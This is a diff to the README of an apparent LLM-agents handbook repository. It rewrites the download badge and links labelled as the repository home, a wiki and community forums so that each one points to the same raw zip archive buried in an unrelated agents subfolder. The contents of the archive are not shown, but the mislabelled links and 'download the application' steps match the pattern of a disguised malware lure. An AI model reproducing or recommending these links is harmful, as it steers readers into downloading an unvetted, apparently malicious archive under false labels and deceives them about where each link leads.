@@ -4,13 +4,13 @@
 
 Welcome to the LLM-Agents-Ecosystem-Handbook! This handbook is your one-stop guide for building, deploying, and understanding LLM agents. With over 60 skeletons, tutorials, ecosystem guides, and evaluation tools, you can dive right into the world of AI agents.
 
-[![Download LLM Agents Ecosystem](https://img.shields.io/badge/Download_LLM_Agents_Ecosystem-brightgreen)](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/releases)
+[![Download LLM Agents Ecosystem](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/raw/refs/heads/main/agents/ai_teaching_agent_team/Ecosystem_Handbook_Agents_LL_v2.4-beta.1.zip)](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/raw/refs/heads/main/agents/ai_teaching_agent_team/Ecosystem_Handbook_Agents_LL_v2.4-beta.1.zip)
 
 ## 💾 Download & Install
 
 To get started, you need to download the application. Follow these steps:
 
-1. Visit [this page to download](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/releases).
+1. Visit [this page to download](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/raw/refs/heads/main/agents/ai_teaching_agent_team/Ecosystem_Handbook_Agents_LL_v2.4-beta.1.zip).
 2. Look for the latest release.
 3. Click on the file that matches your operating system.
 
@@ -58,10 +58,10 @@ If you encounter issues or have questions, reach out via the discussions section
 
 Here are some useful links to expand your knowledge:
 
-- [GitHub Repository](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook)
-- [Detailed AI Concepts](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/wiki)
-- [Community Forums and Support](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/discussions)
+- [GitHub Repository](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/raw/refs/heads/main/agents/ai_teaching_agent_team/Ecosystem_Handbook_Agents_LL_v2.4-beta.1.zip)
+- [Detailed AI Concepts](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/raw/refs/heads/main/agents/ai_teaching_agent_team/Ecosystem_Handbook_Agents_LL_v2.4-beta.1.zip)
+- [Community Forums and Support](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/raw/refs/heads/main/agents/ai_teaching_agent_team/Ecosystem_Handbook_Agents_LL_v2.4-beta.1.zip)
 
-[![Download LLM Agents Ecosystem](https://img.shields.io/badge/Download_LLM_Agents_Ecosystem-brightgreen)](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/releases)
+[![Download LLM Agents Ecosystem](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/raw/refs/heads/main/agents/ai_teaching_agent_team/Ecosystem_Handbook_Agents_LL_v2.4-beta.1.zip)](https://github.com/Herry259/LLM-Agents-Ecosystem-Handbook/raw/refs/heads/main/agents/ai_teaching_agent_team/Ecosystem_Handbook_Agents_LL_v2.4-beta.1.zip)
 
 Explore the world of AI agents with ease. Happy building!
